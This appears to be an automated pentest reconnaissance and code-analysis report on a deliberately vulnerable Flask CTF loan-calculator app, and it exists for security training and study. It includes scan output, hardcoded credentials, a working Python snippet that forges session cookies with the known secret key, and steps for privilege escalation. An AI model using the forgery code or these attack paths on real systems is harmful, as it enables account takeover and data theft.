# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-29 20:13 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000033s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-server-header: Caddy
|_http-title: Site doesn't have a title.
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.4
4444/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
|_http-title: Directory listing for /
| http-git: 
|   127.0.0.1:4444/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: \xE2\x9C\x85 Executive Summary and Report Cleanup: completed successf...
9998/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
| http-git: 
|   127.0.0.1:9998/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: \xE2\x9C\x85 Executive Summary and Report Cleanup: completed successf...
| uptime-agent-info: <!DOCTYPE HTML>
| <html lang="en">
|     <head>
|         <meta charset="utf-8">
|         <title>Error response</title>
|     </head>
|     <body>
|         <h1>Error response</h1>
|         <p>Error code: 400</p>
|         <p>Message: Bad request syntax ('sysinfo').</p>
|         <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_</html>
|_http-title: Directory listing for /
9999/tcp  open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Content-Type: text/plain
|     Date: Thu, 30 Oct 2025 03:13:40 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Thu, 30 Oct 2025 03:13:40 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Thu, 30 Oct 2025 03:13:45 GMT
|_    Connection: close
49152/tcp open  http      Golang net/http server
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Thu, 30 Oct 2025 03:13:40 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.97%I=7%D=10/29%Time=6902D7E4%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,E5,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\n
SF:Access-Control-Allow-Headers:\x20Content-Type\r\nContent-Type:\x20text/
SF:plain\r\nDate:\x20Thu,\x2030\x20Oct\x202025\x2003:13:40\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\nOK")%r(HTTPOptions,C9,"HTTP/1\.1\x20200\x20OK\r\
SF:nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x2
SF:0GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content-T
SF:ype\r\nDate:\x20Thu,\x2030\x20Oct\x202025\x2003:13:40\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(FourOhFourRequest,E5,"HTTP/1\.1\x20200\x20OK\
SF:r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\
SF:x20GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content
SF:-Type\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2030\x20Oct\x202
SF:025\x2003:13:40\x20GMT\r\nConnection:\x20close\r\n\r\nOK")%r(JavaRMI,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,C9,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\
SF:nAccess-Control-Allow-Headers:\x20Content-Type\r\nDate:\x20Thu,\x2030\x
SF:20Oct\x202025\x2003:13:45\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49152-TCP:V=7.97%I=7%D=10/29%Time=6902D7E4%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Thu,\x2030\x20Oct\x202025\x2003:13:40\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Thu,\x2030\x20Oct\
SF:x202025\x2003:13:40\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Thu,\x2030\x20Oct\x202025\x2003:13:40\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds


## Subdomain Discovery (subfinder)
Status: success
www.localhost
naeu2.naeuinc.localhost
mail.regency.localhost
server02.counterintel.localhost
fndlync01.5ninesdata.localhost
mail.localhost
autodiscover.localhost
mse-ca-mail.corp.mse.localhost
owa.regency.localhost
sbs.allsaintsschool.localhost
server2.hunter.localhost
mail02.regency.localhost
tools.sonoma.edu.localhost
exchvm.nwcnet.localhost
autodiscover.regency.localhost
mail03.regency.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:46413[0m [302 Found] [1mApache[0m[[1m[32m2.4.65[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.65 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mRedirectLocation[0m[[0m[22m/login[0m], [1mTitle[0m[[1m[33mRedirecting...[0m]
[1m[34mhttp://localhost:46413/login[0m [200 OK] [1mApache[0m[[1m[32m2.4.65[0m], [1mBootstrap[0m, [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.65 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPasswordField[0m[[0m[22mpassword[0m], [1mScript[0m, [1mTitle[0m[[1m[33mLogin[0m]

## Code Analysis
# Penetration Test Code Analysis Report: XBEN-104-24 Loan Calculator

**Application:** Loan Calculator Web Application  
**Technology Stack:** Python Flask, MySQL, Apache WSGI, Docker  
**Assessment Date:** 2025-10-29  
**Challenge ID:** XBEN-104-24

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), it has been verified to meet the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
Components whose execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints (all 7 HTTP endpoints)
- Endpoints requiring authentication via the application's standard login mechanisms (session-based authentication)
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from in-scope network-reachable code (none found)

### Out-of-Scope: Locally Executable Only
Components that **cannot** be invoked through the running application's network interface include:
- Docker build scripts and Makefiles
- Database initialization scripts
- Development server utilities (`run.py` - local development only)
- Static analysis and testing tools

---

## 1. Executive Summary

This Flask-based loan calculator application presents a **CRITICAL security risk** with multiple high-severity vulnerabilities that enable remote code execution, authentication bypass, and complete data compromise. The application is a deliberately vulnerable CTF challenge (XBEN-104-24) that demonstrates catastrophic security failures across all defense layers.

**Most Critical Findings:**

1. **Server-Side Template Injection (SSTI)** - The `/total_loan_payments` endpoint contains a critical SSTI vulnerability enabling Remote Code Execution (RCE) through the unsanitized `principal` parameter. This vulnerability allows authenticated attackers to execute arbitrary Python code, read sensitive files (including the CTF flag at `/flag`), and achieve complete system compromise.

2. **Plaintext Password Storage** - All user passwords are stored in plaintext in the MySQL database without any hashing or encryption. The authentication logic directly compares plaintext passwords, exposing all credentials in the event of database compromise. A default test account with credentials `test:test` is hardcoded in the application initialization.

3. **Hardcoded Secrets Cascade** - The application contains hardcoded credentials throughout its codebase: the Flask session secret key (`'your_secret_key'`), database root password (`loan_calculator`), and database connection strings. These secrets are committed to version control and enable session forgery, database compromise, and lateral movement.

**Attack Surface Profile:**

The application exposes 7 HTTP endpoints over unencrypted HTTP (port 80), with 5 requiring session-based authentication. No API gateway, Web Application Firewall (WAF), or rate limiting protects these endpoints. The authentication mechanism uses weak session management with a predictable secret key, making session hijacking and forgery trivial. The complete absence of CSRF protection, security headers (CSP, HSTS, X-Frame-Options), and input validation creates multiple exploitation paths.

**Architectural Security Posture:**

This two-tier monolithic architecture (Flask application + MySQL database) lacks fundamental security controls. The application uses HTTP-only communication (no TLS), stores all sensitive data unencrypted (PII, financial information, credentials), and employs the MySQL root account for database operations. The absence of defense-in-depth mechanisms means a single vulnerability (SSTI) provides complete system access. Multiple compliance violations (GDPR, PCI-DSS) indicate this application would be unsuitable for production deployment without comprehensive security remediation.

**CTF Challenge Context:**

As a security training challenge, the flag is stored at `/flag` within the Docker container. The primary exploitation path involves authenticating with default credentials (`test:test`), then exploiting the SSTI vulnerability to read the flag file. Secondary paths include session forgery using the weak secret key or potential SQL injection through ORM bypass.

---

## 2. Architecture & Technology Stack

### Framework & Language

**Primary Technology:** Python 3.x (Debian Bullseye-slim base image) with Flask web framework

The application uses Flask without version pinning in `requirements.txt`, creating dependency management risks. Flask serves as both the web application framework and API layer, handling HTTP request routing, session management, and template rendering. The lack of version constraints (`flask` instead of `flask==3.0.0`) means deployments could inadvertently use vulnerable versions. No Flask extensions for security (Flask-Login, Flask-WTF, Flask-Talisman) are installed, indicating manual implementation of authentication and authorization.

**Security Implications:** Flask's default configuration includes development-friendly settings that may be insecure in production. The application relies on Flask's built-in Jinja2 template engine for rendering, which provides auto-escaping for XSS prevention but does not protect against Server-Side Template Injection when using `render_template_string()` with user input. The absence of security-focused Flask extensions suggests all security controls are custom-implemented, increasing the likelihood of vulnerabilities.

**Database Layer:** Flask-SQLAlchemy ORM with PyMySQL driver (MySQL 5.7.15)

SQLAlchemy provides Object-Relational Mapping (ORM) that generally protects against SQL injection through parameterized queries. However, the application uses unpinned versions (`flask_sqlalchemy` without version specification) and connects to an End-of-Life (EOL) MySQL version. The ORM handles database operations for user authentication, profile management, and loan calculations. The single User model contains all application data, with no separation between authentication credentials and business logic data.

**Security Implications:** MySQL 5.7.15 (released 2016) contains 50+ known CVEs including privilege escalation and denial-of-service vulnerabilities. The EOL status means no security patches are available. The application connects using the MySQL root account (`root:loan_calculator`), violating the principle of least privilege and allowing full database administrative access if compromised. No SSL/TLS parameters exist in the connection string, meaning database traffic is unencrypted within the Docker network.

### Architectural Pattern

**Pattern:** Monolithic Two-Tier Architecture with Docker Containerization

The application follows a traditional two-tier client-server model with all business logic, authentication, and data access consolidated in a single Flask application. This monolith communicates directly with a dedicated MySQL database container through Docker's internal network. The architecture lacks service segmentation, with no separation between public-facing APIs, authentication services, and data processing logic.

```
External Traffic (HTTP:80)
         ↓
    Apache Web Server (Container 1)
         ↓
    mod_wsgi Python Gateway
         ↓
    Flask Application (loan_calculator)
    - Authentication Layer
    - Business Logic (Loan Calculations)
    - Template Rendering
    - Session Management
         ↓
    MySQL Database 5.7.15 (Container 2)
    - User Credentials (plaintext)
    - Profile Data (PII)
    - Financial Data (loan details)
```

**Trust Boundary Analysis:**

The primary trust boundary exists at the HTTP layer where external traffic enters Apache on port 80. However, this boundary is poorly enforced:
- No authentication required for login endpoints (expected for public access)
- Session-based authentication uses a weak secret key, enabling trust boundary bypass through session forgery
- No network segmentation between application and database containers (both on same Docker network)
- Application uses root database credentials, eliminating the database as a separate trust boundary

**Security Implications:**

This architectural pattern concentrates all functionality in a single point of failure. Compromise of the Flask application immediately grants access to all data and functionality. The lack of microservices or API gateway means no service-level isolation, rate limiting, or request filtering occurs before reaching application code. No defense-in-depth layers exist - the application is the only security control. The monolithic design makes privilege escalation straightforward since the application process has database root access and file system access to the CTF flag.

**Deployment Model:** Docker Compose orchestrates two services: `web` (Flask/Apache) and `db` (MySQL). The web service exposes port 80 dynamically, while the database remains internal to the Docker network. The CTF flag is injected during build time as a Docker ARG and written to `/flag` in the container filesystem. Health checks monitor database availability, but no application health monitoring exists.

### Critical Security Components

**Apache Web Server with mod_wsgi:** Apache 2.x serves as the reverse proxy and WSGI gateway, configured via `/app/loan_calculator-httpd.conf`. The VirtualHost configuration enables directory indexing (`Options Indexes FollowSymLinks`), allowing directory browsing and potential information disclosure. A critical misconfiguration sets `Access-Control-Allow-Origin: *`, creating an overly permissive CORS policy that allows any origin to make authenticated requests.

**Security Implication:** The wildcard CORS configuration combined with session-based authentication enables Cross-Origin attacks. Malicious websites can make authenticated requests on behalf of logged-in users, facilitating CSRF attacks and data exfiltration. Directory indexing may expose configuration files, backups, or application structure to reconnaissance. No security headers (CSP, HSTS, X-Frame-Options) are configured, leaving the application vulnerable to clickjacking, MIME-sniffing attacks, and XSS exploitation.

**Flask Session Management:** Sessions are stored client-side as signed cookies using Flask's default session interface. The session secret key (`'your_secret_key'`) signs and validates session data to prevent tampering. Upon successful authentication, the application stores `user_id` in the session, which is used for authorization checks on protected endpoints.

**Security Implication:** The hardcoded, predictable secret key is the application's critical security failure. Flask uses itsdangerous library to sign session cookies with HMAC-SHA1. With a known secret key, attackers can forge arbitrary session cookies, inject any `user_id`, and bypass authentication entirely. The weakness cascades: session forgery enables access to all authenticated endpoints, including the SSTI-vulnerable `/total_loan_payments` endpoint. No session timeout, regeneration on login, or security flags (Secure, SameSite) are configured, further weakening session security.

**SQLAlchemy ORM:** The application uses Flask-SQLAlchemy for database operations with a single User model. All queries use ORM methods (`filter_by()`, `query.get()`) rather than raw SQL, providing parameterization protection against SQL injection. Database operations include user authentication (plaintext password lookup), profile CRUD operations, and loan data management.

**Security Implication:** While ORM usage prevents most SQL injection vectors, the authentication logic contains a fundamental flaw: `User.query.filter_by(username=username, password=password).first()` performs plaintext password comparison. This means passwords are stored without hashing, making the ORM's SQL injection protection irrelevant for credential security. The ORM cannot protect data at rest, and the application's data model stores all PII and financial information in plaintext columns.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

**Session-Based Authentication with Weak Cryptographic Foundation**

The application implements custom session-based authentication using Flask's built-in session management. The authentication flow begins at `/login` (POST) where users submit credentials via HTML form. The application retrieves the username and password from `request.form`, queries the database with `User.query.filter_by(username=username, password=password).first()`, and if a match exists, stores `session['user_id'] = user.id` before redirecting to `/home`.

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/routes.py` (Lines 20-34)

**Critical Vulnerability - Plaintext Password Comparison:**

The authentication logic at line 25 performs direct plaintext password comparison: `user = User.query.filter_by(username=username, password=password).first()`. This reveals that passwords are stored in plaintext in the database password column (String(50) in models.py:9). No hashing algorithm (bcrypt, argon2, pbkdf2, scrypt) is used. This catastrophic failure means:
- Database compromise immediately exposes all user credentials
- Password reuse across services enables lateral movement
- No computational defense against brute force (hashes would slow attacks)
- Violation of GDPR Article 32 (security of processing), NIST SP 800-63B, and OWASP Password Storage Guidelines

**Default Test Credentials:** The application creates a hardcoded test user during initialization (`__init__.py` lines 23-32) with credentials `test:test`. This account is publicly known and provides immediate authenticated access for exploitation.

**Complete List of Authentication API Endpoints:**

1. **`POST /login`** - Primary authentication endpoint
   - **File:** `routes.py` (Lines 20-34)
   - **Input:** `username` (form field), `password` (form field)
   - **Response:** Redirects to `/home` on success, renders error message on failure
   - **Security Issues:** No rate limiting, no account lockout, no CSRF protection, plaintext password comparison
   - **Session Creation:** Sets `session['user_id']` on successful authentication

2. **`GET /logout`** - Session termination endpoint
   - **File:** `routes.py` (Lines 36-40)
   - **Action:** Executes `session.pop('user_id', None)` to clear user_id from session
   - **Response:** Redirects to `/login`
   - **Security Issues:** No CSRF protection (logout CSRF possible), incomplete session invalidation (only removes user_id, other session data may persist)

3. **No Password Reset Endpoint** - Application does not implement password reset functionality
4. **No Token Refresh Endpoint** - Session-based authentication does not use tokens
5. **No MFA Endpoints** - No multi-factor authentication implemented
6. **No OAuth/SSO Endpoints** - No third-party authentication integration

### Session Management and Token Security

**Session Cookie Flags Configuration - Critical Security Gaps**

Flask uses default session cookie configuration without explicit overrides. Through code analysis, no `SESSION_COOKIE_*` configuration variables are set in `__init__.py` or `routes.py`. This means Flask defaults apply:

- **`SESSION_COOKIE_HTTPONLY`:** True by default (✓ SECURE) - Prevents JavaScript access to session cookie, mitigating XSS-based session theft
- **`SESSION_COOKIE_SECURE`:** False by default (✗ INSECURE) - Allows transmission over HTTP, enabling Man-in-the-Middle (MITM) session hijacking
- **`SESSION_COOKIE_SAMESITE`:** None by default in Flask 2.x (✗ INSECURE) - No CSRF protection at cookie level, allows cross-site request inclusion

**Exact Configuration Location:** No explicit cookie flag configuration exists in the codebase. Flask's internal defaults from `flask/sessions.py` are applied. To locate where these should be configured:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Lines 8-12)

The secret key is configured at line 8, but cookie flags are absent:
```python
app.secret_key = 'your_secret_key'  # Line 8 - ONLY session configuration present
# MISSING: app.config['SESSION_COOKIE_SECURE'] = True
# MISSING: app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
# MISSING: app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
```

**Security Implications:**

1. **HTTP Transmission (COOKIE_SECURE=False):** Sessions are transmitted over HTTP (port 80 only, no HTTPS). Network attackers can intercept session cookies through packet sniffing, ARP poisoning, or WiFi eavesdropping. Combined with the weak secret key, this creates two attack paths: network interception or cryptographic session forgery.

2. **CSRF Vulnerability (COOKIE_SAMESITE=None):** Browsers will include session cookies in cross-origin requests. Malicious websites can make authenticated POST requests to `/profile` or GET requests to `/total_loan_payments` (SSTI endpoint) using the victim's session, enabling CSRF attacks and exploitation proxying.

3. **No Session Timeout:** The absence of `PERMANENT_SESSION_LIFETIME` configuration means sessions never expire. Stolen or forged session cookies remain valid indefinitely, even after password changes or logout from other sessions.

**Session Secret Key - The Critical Weakness**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Line 8)

```python
app.secret_key = 'your_secret_key'  # Change this to a secure secret key
```

This hardcoded secret key is Flask's most critical security parameter. Flask uses the `itsdangerous` library to serialize session data and sign it with HMAC-SHA1 using this secret. The session cookie format is: `base64(data).timestamp.signature`. With a known secret key, attackers can:

1. **Forge Arbitrary Sessions:** Generate valid session cookies with any `user_id` value, bypassing authentication entirely
2. **Session Hijacking:** Decode existing session cookies to extract user_id values
3. **Privilege Escalation:** Create sessions for user_id=1 (likely admin) or enumerate user IDs

**Exploitation Example:**
```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
app = Flask(__name__)
app.secret_key = 'your_secret_key'
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
forged_session = session_serializer.dumps({'user_id': 1})
# Use forged_session as cookie value to impersonate user_id=1
```

**Session Fixation Protection - Absent**

**File:** `routes.py` (Line 28)

The login handler sets `session['user_id'] = user.id` without regenerating the session ID. If an attacker can set a victim's session cookie before authentication (session fixation attack), that session ID will remain valid after login. The application should call `session.regenerate()` or Flask-Login's session protection, but neither is implemented.

### Authorization Model and Bypass Scenarios

**Primitive Session-Check Authorization Pattern**

The application implements a manual authorization pattern repeated across all protected endpoints:

```python
user_id = session.get('user_id')
if user_id:
    user = User.query.get(user_id)
    # Proceed with authorized action
else:
    return redirect(url_for('login'))
```

This pattern appears in:
- `/home` (routes.py:45-47)
- `/profile` (routes.py:56-58)
- `/loan_details` (routes.py:79-81)
- `/total_loan_payments` (routes.py:90-92)

**Critical Authorization Vulnerabilities:**

1. **No Decorator-Based Protection:** The absence of `@login_required` decorators means authorization checks are manually coded and prone to omission. Developers might forget authorization checks on new endpoints.

2. **Session Forgery = Complete Bypass:** Since the secret key is weak and known, forging `session['user_id']` bypasses all authorization. The authorization model trusts the session implicitly without additional validation.

3. **No Role-Based Access Control (RBAC):** All authenticated users have identical privileges. No concept of admin users, read-only users, or permission levels exists. The User model lacks a `role` or `permissions` column.

4. **Insecure Direct Object Reference (IDOR) Potential:** The pattern `user = User.query.get(user_id)` retrieves data based solely on session content. If session cookies can be manipulated (via weak secret key), an attacker can access any user's data by setting `user_id` to the target user's ID. No validation confirms that the authenticated user should access that specific user_id's data.

**Horizontal Privilege Escalation Path:**
```
1. Authenticate as test:test (get valid session structure)
2. Forge new session with user_id=2 using known secret key
3. Access /profile with forged session
4. View and modify user_id=2's PII and financial data
```

**State and Nonce Validation in OAuth/OIDC - Not Applicable**

No OAuth or OIDC flows exist. The application does not integrate with third-party identity providers, implement SSO, or use OAuth for API access. No callback endpoints (`/oauth/callback`, `/saml/acs`) are present.

### Multi-Tenancy Security Implementation

**Single-Tenant Architecture - Not Applicable**

The application is designed for single-tenant deployment. Each instance serves one organization with multiple users. No tenant_id, organization_id, or multi-tenant isolation mechanisms exist in the data model. User data is isolated by user_id at the application layer, but no architectural tenant separation exists.

**If Multi-Tenant Considerations Applied:**

The current architecture would fail multi-tenancy security requirements:
- No tenant context in database queries (all queries could access any tenant's data with user_id manipulation)
- No row-level security in MySQL
- No tenant-aware session management
- Shared database schema without tenant_id foreign keys would enable cross-tenant data access

### OAuth/SSO/OIDC Flows - Not Implemented

**Finding:** No Single Sign-On (SSO), OAuth 2.0, or OpenID Connect (OIDC) integration exists.

**Evidence:**
- No OAuth libraries in requirements.txt (no `authlib`, `oauthlib`, `python-jose`)
- No callback endpoints in routes.py
- No state parameter generation or validation code
- No nonce parameter handling (OIDC)
- No token exchange endpoints
- No JWKS (JSON Web Key Set) fetching
- No OAuth client credentials or redirect URI configuration

**Security Implication:** While the absence of OAuth prevents OAuth-specific vulnerabilities (authorization code interception, redirect URI manipulation, PKCE bypass), it also means the application lacks modern authentication patterns. SSO would enable centralized credential management, reducing the plaintext password storage risk if implemented correctly with an external identity provider.

---

## 4. Data Security & Storage

### Database Security - Multiple Critical Failures

**Connection String with Root Credentials**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` (Line 11)

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:loan_calculator@db/database'
```

This connection string reveals three critical security failures:

1. **Root Account Usage:** The application connects as `root`, MySQL's administrative superuser. This violates the principle of least privilege. If the application is compromised (e.g., via SSTI), attackers gain full database control including:
   - Creating new databases and users
   - Dropping tables and data destruction
   - Reading MySQL system tables (user credentials, configuration)
   - Potentially executing MySQL UDF (User Defined Functions) for OS command execution

2. **Hardcoded Credentials:** The password `loan_calculator` is weak (single dictionary word, lowercase) and embedded in source code. Version control systems retain this secret in git history indefinitely. The same password appears in three locations: application code, Dockerfile ENV variables, and docker-compose.yml health checks.

3. **No Connection Encryption:** The connection string lacks SSL/TLS parameters. Database traffic flows unencrypted within the Docker network. While internal network traffic may seem protected, Docker network security depends on container isolation. Compromised containers on the same network can sniff database traffic.

**MySQL Version Security:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/mysql/Dockerfile` (Line 1)
```dockerfile
FROM mysql:5.7.15
```

MySQL 5.7.15 (released October 2016) is End-of-Life (EOL) and contains 50+ documented CVEs including:
- CVE-2017-3636: Client programs unspecified vulnerability (CVSS 5.3)
- CVE-2017-3641: DML privilege escalation (CVSS 4.7)
- CVE-2017-3653: DDL unspecified vulnerability (CVSS 4.3)
- Multiple authentication bypass and denial-of-service vulnerabilities

The EOL status means no security patches are available. Production deployments should use MySQL 8.0+ or managed database services with automatic security updates.

**Database Access Controls:**

No application-specific database user exists. Recommended security practice:
```sql
-- Create limited-privilege user (NOT IMPLEMENTED)
CREATE USER 'loan_app'@'%' IDENTIFIED BY 'strong_random_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON database.users TO 'loan_app'@'%';
-- Application should connect as loan_app, not root
```

### Data Flow Security - Sensitive Data Paths and Protection

**User Authentication Data Flow (CRITICAL VULNERABILITY PATH):**

```
1. User submits credentials (login.html form) → HTTP POST /login
2. Flask receives: username='test', password='test' (plaintext in request.form)
3. Application queries: User.query.filter_by(username='test', password='test')
4. Database performs: SELECT * FROM users WHERE username='test' AND password='test'
5. Password comparison: Plaintext-to-plaintext (no hashing)
6. Session creation: session['user_id'] = user.id (signed with weak secret)
